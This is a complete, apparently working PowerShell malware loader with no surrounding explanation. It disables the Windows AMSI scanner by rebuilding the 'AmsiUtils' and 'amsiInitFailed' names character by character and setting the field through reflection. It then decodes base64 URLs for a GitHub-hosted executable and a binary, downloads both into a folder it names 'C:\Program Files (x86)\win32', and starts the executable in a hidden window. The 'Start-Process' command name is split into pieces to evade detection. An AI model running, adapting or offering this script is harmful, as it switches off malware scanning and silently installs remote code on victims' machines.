$charA = [char]65
$charm = [char]109
$chars = [char]115
$chari = [char]105
$amsiStr = $charA + $charm + $chars + $chari
$systemPart = "System"
$managementPart = "Management"
$automationPart = "Automation"
$amsiUtils = $amsiStr + "Utils"
$amsiType  = $systemPart + "." + $managementPart + "." + $automationPart + "." + $amsiUtils
$lowA = [char]97
$lowMS = "ms"
$lowI = [char]105
$amsiField = $lowA + $lowMS + $lowI + "InitFailed"
$fieldAccess = "NonPublic,Static"
[Ref].Assembly.GetType($amsiType).GetField($amsiField, $fieldAccess).SetValue($null, $true)
$drive = "C:"
$folder1 = "\Program"
$folder2 = " Files"
$folder3 = " (x86)"
$folder4 = "\win32"
$targetDir = $drive + $folder1 + $folder2 + $folder3 + $folder4
$fileService = "win32NotificationService.exe"
$fileUpdate = "win32update.bin"
$servicePath = Join-Path $targetDir $fileService
$updatePath = Join-Path $targetDir $fileUpdate
$encServiceUrl = "aHR0cHM6Ly9naXRodWIuY29tL01hZ3R1cm4vd2luMzIvcmF3L3JlZnMvaGVhZHMvbWFpbi93aW4zMk5vdGlmaWNhdGlvblNlcnZpY2UuZXhl"
$encUpdateUrl  = "aHR0cHM6Ly9naXRodWIuY29tL01hZ3R1cm4vd2luMzIvcmF3L3JlZnMvaGVhZHMvbWFpbi93aW4zMnVwZGF0ZS5iaW4="
$serviceUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encServiceUrl))
$updateUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encUpdateUrl))
if (-not (Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory | Out-Null }
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($serviceUrl, $servicePath)
$wc.DownloadFile($updateUrl, $updatePath)
$startPart1 = "Sta"
$startPart2 = "rt-Proc"
$startPart3 = "ess"
$startProcessCmd = $startPart1 + $startPart2 + $startPart3
$winParam = "-WindowStyle"
$hiddenVal = "Hidden"
& $startProcessCmd -FilePath $servicePath -WindowStyle $hiddenVal
Write-Output "Boom"
